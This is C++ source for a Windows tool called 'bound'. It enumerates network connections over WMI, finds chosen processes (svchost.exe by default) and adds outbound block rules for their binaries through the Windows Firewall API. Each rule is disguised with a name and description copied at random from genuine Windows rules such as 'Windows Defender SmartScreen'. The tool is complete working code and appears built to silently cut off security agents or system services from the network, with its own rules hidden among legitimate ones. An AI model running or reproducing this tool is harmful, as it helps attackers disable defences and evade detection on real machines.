#define _WIN32_DCOM

#include <iostream>
#include <comdef.h>
#include <netfw.h>
#include <random>
#include <set>
#include <sstream>
#include <string>
#include <vector>
#include <Wbemidl.h>

#include "bound.h"
#include "psapi.h"

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

std::vector<Rule> randomRules = {
	{ L"Core Networking - Multicast Listener Done (ICMP v6-In)", L"Multicast Listener Done messages inform local routers that there are no longer any members remaining for a specific multicast address on the subnet." },
	{ L"Core Networking Diagnostics - ICMP Echo Request (ICMPv4-Out)", L"ICMP Echo Request messages are sent as ping requests to other nodes." },
	{ L"File and Printer Sharing (Echo Request - ICMPv4-Out)", L"Echo Request messages are sent as ping requests to other nodes." },
	{ L"Media Center Extenders - Device Provisioning (TCP-Out)", L"Outbound rule for Media Center Extenders to allow traffic for Device Provisioning. [TCP]" },
	{ L"Network Discovery (LLMNR-UDP-Out)", L"Outbound rule for Network Discovery to allow Link Local Multicast Name Resolution. [UDP 5355]" },
	{ L"Network Discovery (WSD Events-Out)", L"Outbound rule for Network Discovery to allow WSDAPI Events via Function Discovery. [TCP 5357]" },
	{ L"App Installer", L"App Installer" },
	{ L"Cast to Device functionality (qWave-UDP-Out)", L"Outbound rule for the Cast to Device functionality to allow use of the Quality Windows Audio Video Experience Service. [UDP 2177]" },
	{ L"Cortana", L"Cortana" },
	{ L"Feedback Hub", L"Feedback Hub" },
	{ L"mDNS (UDP-Out)", L"Outbound rule for mDNS traffic [UDP]" },
	{ L"Media Center Extenders - Device Validation (TCP-Out)", L"Outbound rule for Media Center Extenders to allow traffic for Device Validation. [TCP]" },
	{ L"Microsoft Content", L"Microsoft Content" },
	{ L"Media Center Extenders - WMDRM-ND/RTP/RTCP (UDP-Out)", L"Outbound rule for Media Center Extenders to allow WMDRM-ND and RTP/RTCP AV Streaming. [UDP]" },
	{ L"Microsoft Pay", L"Microsoft Pay" },
	{ L"Network Discovery (WSD-Out)", L"Outbound rule for Network Discovery to discover devices via Function Discovery. [UDP 3702]" },
	{ L"Proximity sharing over TCP (TCP sharing-Out)", L"Outbound rule for Proximity sharing over TCP" },
	{ L"Remote Assistance (SSDP TCP-Out)", L"Outbound rule for Remote Assistance to allow use of Universal Plug and Play. [TCP]" },
	{ L"Start", L"Start" },
	{ L"Wi-Fi Direct Network Discovery (Out)", L"Outbound rule to discover WSD devices on Wi-Fi Direct networks." },
	{ L"Windows Defender SmartScreen", L"Windows Defender SmartScreen" },
	{ L"Windows Maps", L"Windows Maps" },
	{ L"Work or school account", L"Work or school account" },
};

/*
 * Enumerate network connections using the Windows Management Instrumentation (WMI)
 *
 * @params IN OUT std::vector<NetworkConnections>& connections - output vector to put all active connections as NetworkConnection objects
 *
 * @returns BOOL - FALSE if an error occurred, TRUE otherwise
 *
 * @reference https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-reference
 */
BOOL enumConnectionsWMI(IN OUT std::vector<NetworkConnection>& connections) {
    HRESULT hResult; // target class MSFT_NetTCPConnection
    BSTR className = SysAllocString(L"MSFT_NetTCPConnection"); // enumerator object to list instances of MSFT_NetTCPConnection
    IEnumWbemClassObject* enumeratorPointer = nullptr; // initial locator for WMI
    IWbemLocator* wmiLocator = nullptr; // IWbemServices pointer
    IWbemServices* namespacePointer = nullptr;
    BOOL returnValue = FALSE;

	// initialize COM library
    hResult = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hResult)) {
        printf("[!] Failed to initialize COM library: 0x%ld\n", hResult);
        return FALSE;
    }

	// set COM security levels
	/*
	* COM negotiates service
	* authentication services
	* reserved
	* default authentication
	* default impersonation
	* authentication info
	* additional capabilities
	* reserved
	*/
    hResult = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);
    if (FAILED(hResult)) {
        printf("[!] Failed to initialize security: 0x%ld\n", hResult);
        goto cleanup;
    }

	// get the initial locator to WMI
    hResult = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&wmiLocator);
    if (FAILED(hResult)) {
        printf("[!] Failed to create IWbemLocator object: 0x%ld\n", hResult);
        goto cleanup;
    }

	// connect to the local root\cimv2 namespace
	// and obtain pointer to make IWbemServices calls
    hResult = wmiLocator->ConnectServer(_bstr_t(L"ROOT\\StandardCIMV2"), nullptr, nullptr, nullptr, NULL, nullptr, nullptr, &namespacePointer);
    if (FAILED(hResult)) {
        printf("[!] Could not connect: 0x%ld\n", hResult);
        goto cleanup;
    }

	// set security levels for the proxy
	/*
	* proxy to set
	* RPC_C_AUTHN_xxx
	* RPC_C_AUTHZ_xxx
	* server principal name
	* RPC_C_AUTHN_LEVEL_xxx
	* RPC_C_IMP_LEVEL_xxx
	* client identity
	* proxy capabilities
	*/
    hResult = CoSetProxyBlanket(namespacePointer, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
    if (FAILED(hResult)) {
        printf("[!] Could not set proxy blanket: 0x%ld\n", hResult);
        goto cleanup;
    }

    hResult = namespacePointer->CreateInstanceEnum(className, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &enumeratorPointer);
    if (FAILED(hResult)) {
        printf("[!] Query for connections failed: 0x%ld\n", hResult);
        goto cleanup;
    } else {
        IWbemClassObject* pclsObj = nullptr;
        ULONG uReturn = 0;

    	// iterate through each instance and extract
    	// relevant network connection information
        while (enumeratorPointer) {
            enumeratorPointer->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

            if (uReturn == 0)
                break;

            VARIANT owningPID, localAddress, localPort, remoteAddress, remotePort;
            NetworkConnection connection = { 0 };

        	// get values from object
            pclsObj->Get(L"OwningProcess", 0, &owningPID, nullptr, nullptr);
            pclsObj->Get(L"LocalAddress", 0, &localAddress, nullptr, nullptr);
            pclsObj->Get(L"LocalPort", 0, &localPort, nullptr, nullptr);
            pclsObj->Get(L"RemoteAddress", 0, &remoteAddress, nullptr, nullptr);
            pclsObj->Get(L"RemotePort", 0, &remotePort, nullptr, nullptr);

        	// populate struct and add to vector
            connection.owningProcess = owningPID.ulVal;
            connection.localAddress = localAddress.bstrVal;
            connection.localPort = localPort.uintVal;
            connection.remoteAddress = remoteAddress.bstrVal;
            connection.remotePort = remotePort.uintVal;

            connections.push_back(connection);

        	// clean up before we tear up the next object
            VariantClear(&owningPID);
            VariantClear(&localAddress);
            VariantClear(&localPort);
            VariantClear(&remoteAddress);
            VariantClear(&remotePort);
            pclsObj->Release();
        }

        returnValue = TRUE;
    }

cleanup:
    if (wmiLocator) wmiLocator->Release();
    if (namespacePointer) namespacePointer->Release();
    if (enumeratorPointer) enumeratorPointer->Release();
    SysFreeString(className);
    CoUninitialize();
    return returnValue;
}

/*
 * Get image filename of a given process
 *
 * @param DWORD pid - Process ID to find image filename of
 *
 * @returns std::wstring - the image filename of the given process ID
 *
 * @example getImageFileName(3912) returns "C:\Windows\System32\svchost.exe"
 *
 * @reference https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-queryfullprocessimagenamew
 */
std::wstring getImageFileName(IN DWORD pid) {
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (hProcess == nullptr) {
		return L"";
	}

	wchar_t buffer[MAX_PATH];
	DWORD bufferSize = MAX_PATH;

	if (QueryFullProcessImageNameW(hProcess, 0, buffer, &bufferSize)) {
		CloseHandle(hProcess);
		return std::wstring(buffer);
	} else {
		CloseHandle(hProcess);
		return L"";
	}
}

/*
 * Convert IP to CIDR range
 *
 * @param IN const std::wstring& ip - ip address to convert to range
 *
 * @returns std::wstring ip - ip range string
 *
 * @example ipToRange("192.168.1.8") returns -> "192.168.0.0/16"
 */
std::wstring ipToRange(IN const std::wstring& ip) {
	if (ip ==  L"::") {
		printf("[!] Invalid IP address\n");
		return L"";
	}

	std::wstringstream ss(ip);
	std::wstring token;
	int octets[4];

	for (int & octet : octets) {
		std::getline(ss, token, L'.');
		octet = std::stoi(token);
		if (octet < 0 || octet > 255) {
			printf("[!] Invalid IP address\n");
			return L"";
		}
	}

	int prefix_length = (octets[1] != 0) ? 16 : (octets[2] != 0) ? 24 : 8;

	std::wstringstream cidr_ss;
	cidr_ss << octets[0] << L'.';
	cidr_ss << ((prefix_length >= 16) ? octets[1] : 0) << L'.';
	cidr_ss << ((prefix_length >= 24) ? octets[2] : 0) << L'.';
	cidr_ss << L"0/" << prefix_length;

	return cidr_ss.str();
}

/*
 * Get a random firewall rule in a Rule object from a vector of rules
 *
 * @param IN std::vector<Rule> rulesVector - vector of Rule object representing a list of
 *											 possible rules to pick from
 *
 * @returns Rule - the Rule object chosen pseudo-randomly
 *
 * @example getRandomRule(randomRules) returns Rule{"mDNS (UDP-Out)", "Outbound rule for mDNS traffic [UDP]"}
 */
Rule getRandomRule(IN std::vector<Rule> rulesVector) {
	if (rulesVector.empty())
		return { L"", L"" };

	// generate a random index within the range of the vector size
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(0, static_cast<int>(rulesVector.size()) - 1);
	int randomIndex = dis(gen);

	return rulesVector[randomIndex];
}

/*
 * Check if vector of all active connections contain the PIDs of the processes to block
 *
 * @param IN const std::vector<DWORD>& targetPIDs - the vector of PIDs we want to block
 * @param IN const std::vector<NetworkConnection>& allConnections - vector containing all active connections enumerated with WMI
 * @param IN OUT std::vector<NetworkConnections>& connectionsToBlock - output vector contianing all the NetworkConnection objects for the PIDs to block
 */
void filterConnections(IN const std::vector<DWORD>& targetPIDs, IN const std::vector<NetworkConnection>& allConnections, IN OUT std::vector<NetworkConnection>& connectionsToBlock) {
	std::set<DWORD> targetPIDSet(targetPIDs.begin(), targetPIDs.end());
	for (const auto& connection : allConnections) {
		if (targetPIDSet.find(connection.owningProcess) != targetPIDSet.end() &&
			connection.remoteAddress != L"0.0.0.0" &&
			connection.remoteAddress != L"127.0.0.1" &&
			!connection.remoteAddress.empty() &&
			connection.remoteAddress != L"::") {
				connectionsToBlock.push_back(connection);
			}
	}
}

/*
 * Filter running processes to get vector of PIDs of a list of processes
 *
 * @param IN const std::vector<std::wstring>& processNames - process names to find the PID of
 * @param IN OUT std::vector<DWORD>& foundPIDs - output vector of all the PIDs found for the specified process names
 *
 * @returns BOOL - FALSE if an error occurred, TRUE otherwise
 *
 * @reference https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getmodulebasenamea
 */
BOOL filterProcesses(IN const std::vector<std::wstring>& processNames, OUT std::vector<DWORD>& foundPIDs) {
	DWORD processIds[1024], bytesReturned = 0, numberOfProcesses = 0;
	WCHAR processName[MAX_PATH];

	if (!EnumProcesses(processIds, sizeof(processIds), &bytesReturned)) {
		wprintf(L"[!] EnumProcesses failed: 0x%ld\n", GetLastError());
		return FALSE;
	}

	numberOfProcesses = bytesReturned / sizeof(DWORD);
	std::set<std::wstring> targetProcesses(processNames.begin(), processNames.end());

	for (DWORD i = 0; i < numberOfProcesses; ++i) {
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
		if (hProcess) {
			if (GetModuleBaseNameW(hProcess, nullptr, processName, MAX_PATH)) {
				if (targetProcesses.find(processName) != targetProcesses.end()) {
					foundPIDs.push_back(processIds[i]);
				}
			}
			CloseHandle(hProcess);
		}
	}

	return TRUE;
}

/*
 * Add a new firewall rule using the Windows Firewall with Advanced Security API
 *
 * @param IN const std::wstring& binaryPath - full imagepath of the binary to block
 * @param IN const std::wstring& ipRange - CIDR ip range to block
 *
 * @returns BOOL - FALSE if an error occurred, TRUE otherwise
 *
 * @reference https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ics/using-windows-firewall-with-advanced-security
 */
BOOL setFWRule(IN const std::wstring& binaryPath, IN const std::wstring& ipRange) {
	std::wcout << "[~] Setting FW rule for " << binaryPath << " on ip range " << ipRange << std::endl;

	BOOL retValue = FALSE;
	HRESULT hrComInit = S_OK; // result of COM initialization
	HRESULT hResult = S_OK; // result of COM operations
	INetFwPolicy2* netFirewallPolicy = nullptr; // pointer to the firewall policy object
	INetFwRules* firewallRules = nullptr; // pointer to the collection of firewall rules
	INetFwRule* newRule = nullptr; // pointer to the new firewall rule object
	constexpr long CurrentProfilesBitMask = NET_FW_PROFILE2_DOMAIN | NET_FW_PROFILE2_PRIVATE | NET_FW_PROFILE2_PUBLIC; // bitmask representing the current profiles

	// new rule settings
	Rule rule = getRandomRule(randomRules);
	BSTR ruleName = SysAllocString(rule.ruleName.c_str());
	BSTR ruleGroup = SysAllocString(rule.ruleName.c_str());
	BSTR ruleDescription = SysAllocString(rule.ruleDescription.c_str());
	BSTR ruleApplication = SysAllocString(binaryPath.c_str()); // ruleApplication of format L"C:\\Program Files\\something.exe"
	BSTR ruleAddresses = SysAllocString(ipRange.c_str());

	// initialize COM library
	hrComInit = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
	if (FAILED(hrComInit)) {
		printf("[!] Failed to initialize COM library failed: 0x%08lx\n", hrComInit);
		goto cleanup;
	}

	// load NetFwPolicy2 COM
	hResult = CoCreateInstance(__uuidof(NetFwPolicy2), nullptr, CLSCTX_INPROC_SERVER, __uuidof(INetFwPolicy2), (LPVOID*)&netFirewallPolicy);
	if (FAILED(hResult)) {
		printf("[!] CoCreateInstance failed to run on firewall policy: 0x%08lx\n", hResult);
		goto cleanup;
	}

	// get all rules
	hResult = netFirewallPolicy->get_Rules(&firewallRules);
	if (FAILED(hResult)) {
		printf("[!] get_Rules failed: 0x%08lx\n", hResult);
		goto cleanup;
	}

	// create a new firewall fule object
	hResult = CoCreateInstance(__uuidof(NetFwRule), nullptr, CLSCTX_INPROC_SERVER, __uuidof(INetFwRule), (void**)&newRule);
	if (FAILED(hResult)) {
		printf("[!] CoCreateInstance failed to run on firewall rule: 0x%08lx\n", hResult);
		goto cleanup;
	}

	// populate the rule object
	/*
	* TO REVERT ADD
	* pFwRule->put_RemoteAddresses(bstrRuleRAddrs);
	*/
	newRule->put_Name(ruleName);
	newRule->put_Description(ruleDescription);
	newRule->put_ApplicationName(ruleApplication);
	newRule->put_Protocol(NET_FW_IP_PROTOCOL_ANY);
	newRule->put_Direction(NET_FW_RULE_DIR_OUT);
	newRule->put_Grouping(ruleGroup);
	newRule->put_Profiles(CurrentProfilesBitMask);
	newRule->put_Action(NET_FW_ACTION_BLOCK);
	newRule->put_Enabled(VARIANT_TRUE);

	// add rule
	hResult = firewallRules->Add(newRule);
	if (FAILED(hResult)) {
		printf("[!] Failed to add firewall rule: 0x%08lx\n", hResult);
		goto cleanup;
	}

	retValue = TRUE;

cleanup:
	SysFreeString(ruleName);
	SysFreeString(ruleDescription);
	SysFreeString(ruleGroup);
	SysFreeString(ruleApplication);
	SysFreeString(ruleAddresses);

	if (newRule != nullptr)
		newRule->Release();

	if (firewallRules != nullptr)
		firewallRules->Release();

	if (netFirewallPolicy != nullptr)
		netFirewallPolicy->Release();

	if (SUCCEEDED(hrComInit))
		CoUninitialize();

	return retValue;
}

int main() {
	printf("[~] starting bound\n");

	std::vector<NetworkConnection> allConnections;
	std::vector<NetworkConnection> connectionsToBlock;
	std::vector<DWORD> foundPIDs;

	// fill this vector will all the processes to block
	std::vector<std::wstring> processesToBlock = { L"svchost.exe" };

	if (!enumConnectionsWMI(allConnections)) {
		std::cout << "[!] Error while enumerating WMI connections" << std::endl;
		return 1;
	}

	if (!filterProcesses(processesToBlock, foundPIDs) || foundPIDs.empty()) {
		std::cout << "[!] Error while filtering processes" << std::endl;
		return 1;
	}

	filterConnections(foundPIDs, allConnections, connectionsToBlock);
	std::cout << "[~] Found " << connectionsToBlock.size() << " connections to block" << std::endl;

	for (const auto& connection : connectionsToBlock) {
		std::wstring fullPath = getImageFileName(connection.owningProcess);
		std::wstring ipRange = ipToRange(connection.remoteAddress);
		std::wcout << "[~] Setting rule for " << fullPath << " and range " << ipRange << std::endl;

		if (!setFWRule(fullPath, ipRange))
			std::wcout << "[!] Failed setting rule for " << fullPath << " and range " << ipRange << std::endl;
	}

	return 0;
}